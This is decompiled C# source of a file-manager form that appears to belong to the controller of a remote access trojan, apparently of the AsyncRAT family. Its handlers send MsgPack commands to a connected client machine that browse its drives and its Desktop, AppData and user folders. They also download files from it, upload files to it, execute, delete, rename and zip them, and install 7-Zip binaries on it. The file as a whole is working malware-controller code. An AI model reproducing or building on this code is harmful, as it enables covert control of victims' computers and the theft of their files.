using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using DarkUI.Controls;
using DarkUI.Forms;
using Microsoft.VisualBasic;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;

namespace Server.Forms
{
	// Token: 0x0200005C RID: 92
	public partial class FormFileManager : DarkForm
	{
		// Token: 0x170000A0 RID: 160
		// (get) Token: 0x06000377 RID: 887 RVA: 0x000217F8 File Offset: 0x000217F8
		// (set) Token: 0x06000378 RID: 888 RVA: 0x00021800 File Offset: 0x00021800
		public global::Form1 F { get; set; }

		// Token: 0x170000A1 RID: 161
		// (get) Token: 0x06000379 RID: 889 RVA: 0x0002180C File Offset: 0x0002180C
		// (set) Token: 0x0600037A RID: 890 RVA: 0x00021814 File Offset: 0x00021814
		internal Clients Client { get; set; }

		// Token: 0x170000A2 RID: 162
		// (get) Token: 0x0600037B RID: 891 RVA: 0x00021820 File Offset: 0x00021820
		// (set) Token: 0x0600037C RID: 892 RVA: 0x00021828 File Offset: 0x00021828
		public string FullPath { get; set; }

		// Token: 0x0600037D RID: 893 RVA: 0x00021834 File Offset: 0x00021834
		public FormFileManager()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600037E RID: 894 RVA: 0x00021844 File Offset: 0x00021844
		private void listView1_DoubleClick(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count == 1)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getPath";
					msgPack.ForcePathObject("Path").AsString = this.listView1.SelectedItems[0].ToolTipText;
					this.listView1.Enabled = false;
					this.toolStripStatusLabel3.ForeColor = Color.Green;
					this.toolStripStatusLabel3.Text = "Please Wait";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600037F RID: 895 RVA: 0x00021924 File Offset: 0x00021924
		private void backToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				string text = this.toolStripStatusLabel1.Text;
				if (text.Length <= 3)
				{
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getDrivers";
					this.toolStripStatusLabel1.Text = "";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
				else
				{
					text = text.Remove(text.LastIndexOfAny(new char[] { '\\' }, text.LastIndexOf('\\')));
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getPath";
					msgPack.ForcePathObject("Path").AsString = text + "\\";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack2.ForcePathObject("Command").AsString = "getDrivers";
				this.toolStripStatusLabel1.Text = "";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
			}
		}

		// Token: 0x06000380 RID: 896 RVA: 0x00021AB4 File Offset: 0x00021AB4
		private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID)))
					{
						Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID));
					}
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						if (listViewItem.ImageIndex == 0 && listViewItem.ImageIndex == 1 && listViewItem.ImageIndex == 2)
						{
							break;
						}
						MsgPack msgPack = new MsgPack();
						string dwid = Guid.NewGuid().ToString();
						msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
						msgPack.ForcePathObject("Command").AsString = "socketDownload";
						msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
						msgPack.ForcePathObject("DWID").AsString = dwid;
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
						base.BeginInvoke(new MethodInvoker(delegate()
						{
							if ((FormDownloadFile)Application.OpenForms["socketDownload:" + dwid] == null)
							{
								new FormDownloadFile
								{
									Name = "socketDownload:" + dwid,
									Text = "socketDownload:" + this.Client.ID,
									F = this.F,
									DirPath = this.FullPath
								}.Show();
							}
						}));
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000381 RID: 897 RVA: 0x00021C88 File Offset: 0x00021C88
		private void uPLOADToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.toolStripStatusLabel1.Text.Length >= 3)
			{
				try
				{
					OpenFileDialog openFileDialog = new OpenFileDialog();
					openFileDialog.Multiselect = true;
					if (openFileDialog.ShowDialog() == DialogResult.OK)
					{
						foreach (string text in openFileDialog.FileNames)
						{
							if ((FormDownloadFile)Application.OpenForms["socketDownload:"] == null)
							{
								FormDownloadFile formDownloadFile = new FormDownloadFile
								{
									Name = "socketUpload:" + Guid.NewGuid().ToString(),
									Text = "socketUpload:" + this.Client.ID,
									F = Program.form1,
									Client = this.Client
								};
								formDownloadFile.FileSize = new FileInfo(text).Length;
								formDownloadFile.labelfile.Text = Path.GetFileName(text);
								formDownloadFile.FullFileName = text;
								formDownloadFile.label1.Text = "Upload:";
								formDownloadFile.ClientFullFileName = this.toolStripStatusLabel1.Text + "\\" + Path.GetFileName(text);
								MsgPack msgPack = new MsgPack();
								msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
								msgPack.ForcePathObject("Command").AsString = "reqUploadFile";
								msgPack.ForcePathObject("ID").AsString = formDownloadFile.Name;
								formDownloadFile.Show();
								ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
							}
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000382 RID: 898 RVA: 0x00021E58 File Offset: 0x00021E58
		private void dELETEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						if (listViewItem.ImageIndex != 0 && listViewItem.ImageIndex != 1 && listViewItem.ImageIndex != 2)
						{
							MsgPack msgPack = new MsgPack();
							msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
							msgPack.ForcePathObject("Command").AsString = "deleteFile";
							msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
						}
						else if (listViewItem.ImageIndex == 0)
						{
							MsgPack msgPack2 = new MsgPack();
							msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
							msgPack2.ForcePathObject("Command").AsString = "deleteFolder";
							msgPack2.ForcePathObject("Folder").AsString = listViewItem.ToolTipText;
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000383 RID: 899 RVA: 0x00021FFC File Offset: 0x00021FFC
		private void rEFRESHToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.toolStripStatusLabel1.Text != "")
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "getPath";
					msgPack.ForcePathObject("Path").AsString = this.toolStripStatusLabel1.Text;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
				else
				{
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack2.ForcePathObject("Command").AsString = "getDrivers";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000384 RID: 900 RVA: 0x000220F8 File Offset: 0x000220F8
		private void eXECUTEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
						msgPack.ForcePathObject("Command").AsString = "execute";
						msgPack.ForcePathObject("File").AsString = listViewItem.ToolTipText;
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000385 RID: 901 RVA: 0x000221E8 File Offset: 0x000221E8
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x06000386 RID: 902 RVA: 0x00022234 File Offset: 0x00022234
		private void DESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "DESKTOP";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x06000387 RID: 903 RVA: 0x000222C0 File Offset: 0x000222C0
		private void APPDATAToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "APPDATA";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x06000388 RID: 904 RVA: 0x0002234C File Offset: 0x0002234C
		private void CreateFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Create Folder", "Name", Path.GetRandomFileName().Replace(".", ""), -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "createFolder";
					msgPack.ForcePathObject("Folder").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000389 RID: 905 RVA: 0x00022418 File Offset: 0x00022418
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					StringBuilder stringBuilder = new StringBuilder();
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						stringBuilder.Append(listViewItem.ToolTipText + "-=>");
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "copyFile";
					msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
					msgPack.ForcePathObject("IO").AsString = "copy";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600038A RID: 906 RVA: 0x00022540 File Offset: 0x00022540
		private void PasteToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "pasteFile";
				msgPack.ForcePathObject("File").AsString = this.toolStripStatusLabel1.Text;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x0600038B RID: 907 RVA: 0x000225D0 File Offset: 0x000225D0
		private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count == 1)
			{
				try
				{
					string text = Interaction.InputBox("Rename File or Folder", "Name", this.listView1.SelectedItems[0].Text, -1, -1);
					if (!string.IsNullOrEmpty(text))
					{
						if (this.listView1.SelectedItems[0].ImageIndex != 0 && this.listView1.SelectedItems[0].ImageIndex != 1 && this.listView1.SelectedItems[0].ImageIndex != 2)
						{
							MsgPack msgPack = new MsgPack();
							msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
							msgPack.ForcePathObject("Command").AsString = "renameFile";
							msgPack.ForcePathObject("File").AsString = this.listView1.SelectedItems[0].ToolTipText;
							msgPack.ForcePathObject("NewName").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
						}
						else if (this.listView1.SelectedItems[0].ImageIndex == 0)
						{
							MsgPack msgPack2 = new MsgPack();
							msgPack2.ForcePathObject("Pac_ket").AsString = "fileManager";
							msgPack2.ForcePathObject("Command").AsString = "renameFolder";
							msgPack2.ForcePathObject("Folder").AsString = this.listView1.SelectedItems[0].ToolTipText + "\\";
							msgPack2.ForcePathObject("NewName").AsString = Path.Combine(this.toolStripStatusLabel1.Text, text);
							ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600038C RID: 908 RVA: 0x000227F8 File Offset: 0x000227F8
		private void UserProfileToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
				msgPack.ForcePathObject("Command").AsString = "getPath";
				msgPack.ForcePathObject("Path").AsString = "USER";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x0600038D RID: 909 RVA: 0x00022884 File Offset: 0x00022884
		private void DriversListsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "getDrivers";
			this.toolStripStatusLabel1.Text = "";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x0600038E RID: 910 RVA: 0x000228F4 File Offset: 0x000228F4
		private void OpenClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				Process.Start(this.FullPath);
			}
			catch
			{
			}
		}

		// Token: 0x0600038F RID: 911 RVA: 0x00022944 File Offset: 0x00022944
		private void FormFileManager_FormClosed(object sender, FormClosedEventArgs e)
		{
			ThreadPool.QueueUserWorkItem(delegate(object o)
			{
				Clients client = this.Client;
				if (client == null)
				{
					return;
				}
				client.Disconnected();
			});
		}

		// Token: 0x06000390 RID: 912 RVA: 0x00022958 File Offset: 0x00022958
		private void CutToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					StringBuilder stringBuilder = new StringBuilder();
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						stringBuilder.Append(listViewItem.ToolTipText + "-=>");
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "copyFile";
					msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
					msgPack.ForcePathObject("IO").AsString = "cut";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000391 RID: 913 RVA: 0x00022A80 File Offset: 0x00022A80
		private void ZipToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					StringBuilder stringBuilder = new StringBuilder();
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						stringBuilder.Append(listViewItem.ToolTipText + "-=>");
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
					msgPack.ForcePathObject("Command").AsString = "zip";
					msgPack.ForcePathObject("Path").AsString = stringBuilder.ToString();
					msgPack.ForcePathObject("Zip").AsString = "true";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000392 RID: 914 RVA: 0x00022BA8 File Offset: 0x00022BA8
		private void UnzipToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					foreach (object obj in this.listView1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
						msgPack.ForcePathObject("Command").AsString = "zip";
						msgPack.ForcePathObject("Path").AsString = listViewItem.ToolTipText;
						msgPack.ForcePathObject("Zip").AsString = "false";
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000393 RID: 915 RVA: 0x00022CB0 File Offset: 0x00022CB0
		private void InstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "fileManager";
			msgPack.ForcePathObject("Command").AsString = "installZip";
			msgPack.ForcePathObject("exe").SetAsBytes(Resources._7z);
			msgPack.ForcePathObject("dll").SetAsBytes(Resources._7z1);
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}
	}
}
